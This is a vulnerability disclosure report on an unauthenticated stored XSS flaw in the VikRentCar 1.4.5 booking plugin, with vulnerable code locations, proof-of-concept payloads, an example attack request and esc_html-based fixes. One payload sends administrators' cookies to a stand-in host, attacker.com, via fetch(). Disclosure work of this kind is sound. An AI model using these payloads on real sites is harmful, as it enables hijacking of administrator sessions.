# VikRentCar 1.4.5 - Stored Cross-Site Scripting (XSS) Vulnerability Report

---

## Vulnerability Overview

| Item | Details |
|------|---------|
| **Vulnerability Type** | Stored Cross-Site Scripting (XSS) |
| **CVE** | Pending |
| **Affected Version** | VikRentCar â‰¤ 1.4.5 |
| **Severity** | High (CVSS 3.1: 6.1) |
| **Authentication Required** | No (Unauthenticated) |
| **Report Date** | 2026-03-13 |

---

## Vulnerability Description

VikRentCar plugin contains a stored XSS vulnerability that allows attackers to inject malicious JavaScript code through custom fields in the booking form. When administrators view order details in the backend, the malicious code executes automatically.

---

## Vulnerability Location

### ðŸ”´ Entry Point (No Input Filtering)

**File:** `site/controller.php:253`

```php
// Saving user input to custdata array without any filtering
foreach ($cfields as $cf) {
    if ($cf['type'] != 'separator' && $cf['type'] != 'country' && ( $cf['type'] != 'checkbox' || ($cf['type'] == 'checkbox' && intval($cf['required']) != 1) ) ) {
        // âš ï¸ Direct user input without filtering
        $arrcustdata[JText::translate($cf['name'])] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
        $arrcfields[$cf['id']] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
        $nextorderdata['customfields'][$cf['id']] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
    }
}
```

**File:** `site/controller.php:602`

```php
// Store user data to database without filtering
$custdata = VikRentCar::buildCustData($arrcustdata, "\n");

// SQL Insert
$q = "INSERT INTO `#__vikrentcar_orders` (`custdata`, ...) VALUES(" . $dbo->quote($custdata) . ", ...);";
```

---

### ðŸ”´ Trigger Point (No Output Filtering)

**File:** `admin/views/editorder/tmpl/default.php:475`

```php
<!-- âš ï¸ Direct output of user data without any filtering -->
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br($row['custdata']); ?></span>
```

**File:** `admin/views/editorder/tmpl/default.php:479`

```php
<!-- âš ï¸ Another direct output -->
<?php echo nl2br($row['custdata']); ?>
```

**File:** `site/views/order/tmpl/default.php:219`

```php
<!-- Frontend order details page has the same issue -->
<span class="vrcvordudatatitle"><?php echo JText::translate('VRPERSDETS'); ?></span> <?php echo nl2br($ord['custdata']); ?>
```

---

### Code Flow

```
Attacker submits form
       â†“
site/controller.php (Entry Point)
  â†“
VikRequest::getString() - Get user input
  â†“
No filtering â†’ Store to database ($custdata)
  â†“
Admin views order
  â†“
admin/views/editorder/tmpl/default.php (Trigger Point)
  â†“
nl2br() output â†’ XSS executes!
```

---

### Affected Data

- **Table:** `#__vikrentcar_orders`
- **Field:** `custdata`
- **Example Content:**
```
Name: <img src=x onerror=alert(1)>
Email: test@test.com
Phone: 123456
```

---

## Exploitation

### Attack Chain

1. **Attacker** (no login required) visits the frontend booking page
2. Enters XSS payload in custom fields (e.g., name, phone)
3. Submits booking â†’ Data stored in database
4. **Administrator** logs in and views order details in backend
5. XSS triggers â†’ Attacker can steal admin cookies/sessions

### PoC Payload

```html
<!-- Simple Test -->
<img src=x onerror=alert(document.domain)>

<!-- Steal Cookies -->
<script>fetch('https://attacker.com?c='+document.cookie)</script>

<!-- Bypass Filter -->
<img src=x onerror=alert(1)>
```

### Example Attack Request

```http
POST /index.php?option=com_vikrentcar&task=saveorder HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 156

car=1&days=1&pickup=1735689600&release=1735776000&prtar=1&place=1&returnplace=1&priceid=1&vrcf2=<img+src=x+onerror=alert(document.cookie)>
```

---

## Bug Bounty Eligibility

| Wordfence Requirement | Status |
|---------------------|--------|
| Stored XSS | âœ… |
| Exploitable by Unauthenticated Users | âœ… |
| Installation Count â‰¥ 500 | âœ… |
| Significant Impact | âœ… |

---

## Remediation

### Solution 1: Output Filtering (Recommended)

**File:** `admin/views/editorder/tmpl/default.php:475`

```php
// Before (Vulnerable) âš ï¸
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br($row['custdata']); ?></span>

// After (Fixed) âœ…
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br(esc_html($row['custdata'])); ?></span>
```

**File:** `site/views/order/tmpl/default.php:219`

```php
// Before (Vulnerable) âš ï¸
<?php echo nl2br($ord['custdata']); ?>

// After (Fixed) âœ…
<?php echo nl2br(esc_html($ord['custdata'])); ?>
```

### Solution 2: Input Filtering

**File:** `site/controller.php:253`

```php
// Before (Vulnerable) âš ï¸
$arrcustdata[JText::translate($cf['name'])] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');

// After (Fixed) âœ…
$arrcustdata[JText::translate($cf['name'])] = sanitize_text_field(VikRequest::getString('vrcf' . $cf['id'], '', 'request'));
```

---

## Impact Assessment

| Dimension | Assessment |
|-----------|------------|
| **Confidentiality** | Medium - Attacker can steal sensitive data |
| **Integrity** | Medium - Can modify page content |
| **Availability** | Low - No direct impact |
| **Attack Complexity** | Low - No special skills required |
| **Privilege Required** | None - Exploitable by unauthenticated users |

---

## Timeline

| Date | Event |
|------|-------|
| 2026-03-13 | Vulnerability Discovered |
| 2026-03-13 | Report Generated |
| - | Submitted to Vendor |
| - | Vendor Confirmed |
| - | Vulnerability Patched |
| - | Public Disclosure |

---

## Vulnerability Code Summary

### 1. Input (site/controller.php)

```php
// Line 253
$arrcustdata[JText::translate($cf['name'])] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
```

### 2. Storage (site/controller.php)

```php
// Line 602
$custdata = VikRentCar::buildCustData($arrcustdata, "\n");
// ...
$q = "INSERT INTO `#__vikrentcar_orders` ... VALUES(..., " . $dbo->quote($custdata) . ", ...";
```

### 3. Output (admin/views/editorder/tmpl/default.php)

```php
// Line 475
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br($row['custdata']); ?></span>

// Line 479
<?php echo nl2br($row['custdata']); ?>
```

---

